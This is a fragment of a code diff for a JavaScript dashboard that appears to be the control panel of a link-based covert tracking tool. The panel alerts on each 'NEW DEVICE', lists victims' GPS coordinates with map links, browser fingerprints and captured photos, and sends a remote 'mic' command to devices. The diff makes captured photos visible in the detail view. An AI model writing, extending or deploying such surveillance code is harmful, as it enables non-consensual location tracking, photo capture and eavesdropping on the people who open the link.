+  try{ localStorage.setItem('lh_cache',JSON.stringify(all)); }catch(e){}
+  if(fresh){ beep(); navigator.vibrate&&navigator.vibrate(60); setStatus('NEW DEVICE',true); }
+  else setStatus(Object.keys(all).length?Object.keys(all).length+' device(s) live':'link ready',Object.keys(all).length>0);
 }
 function beep(){ try{
   actx=actx||new (window.AudioContext||window.webkitAudioContext)();
@@ -727,12 +782,12 @@ function render(all){
   rows.forEach(x=>loadMedia(x.id,x.r));
 }
 function devCard(id,r){
-  const live=Date.now()-(r.lastSeen||0)<40000;
+  const live=Date.now()-(r.lastSeen||0)<60000;
   const loc=r.gpsLat?r.gpsLat.toFixed(5)+', '+r.gpsLon.toFixed(5)
     :([r.city,r.region,r.country].filter(Boolean).join(', ')||'—');
   const map=r.gpsLat?`https://www.google.com/maps?q=${r.gpsLat},${r.gpsLon}`
     :(r.lat?`https://www.google.com/maps?q=${r.lat},${r.lon}`:null);
-  return `<div class="dev" data-id="${esc(id)}">
+  return `<div class="dev">
     <div class="devhead">
       <div class="avatar" id="av-${esc(id)}">📱</div>
       <div style="flex:1;min-width:0">
@@ -791,7 +846,7 @@ document.addEventListener('click',async e=>{
   if(act==='mic'){ await DB.put('c-'+id,{cmd:'mic',ts:Date.now()}); toast('mic sent'); b.textContent='🎙 SENT'; }
   if(act==='detail'){
     const d=$('#dt-'+id); d.hidden=!d.hidden; if(d.hidden)return;
-    const skip=new Set(['fp','ua','fonts','plugins','voices','codecs','photo']);
+    const skip=new Set(['fp','ua','fonts','plugins','voices','codecs']);
     d.innerHTML='<pre class="out">'+Object.entries(r).filter(([k])=>!skip.has(k))
       .map(([k,v])=>'<div class="kv"><b>'+esc(k)+'</b><i>'+esc(typeof v==='object'?JSON.stringify(v):v)+'</i></div>').join('')+'</pre>';
   }
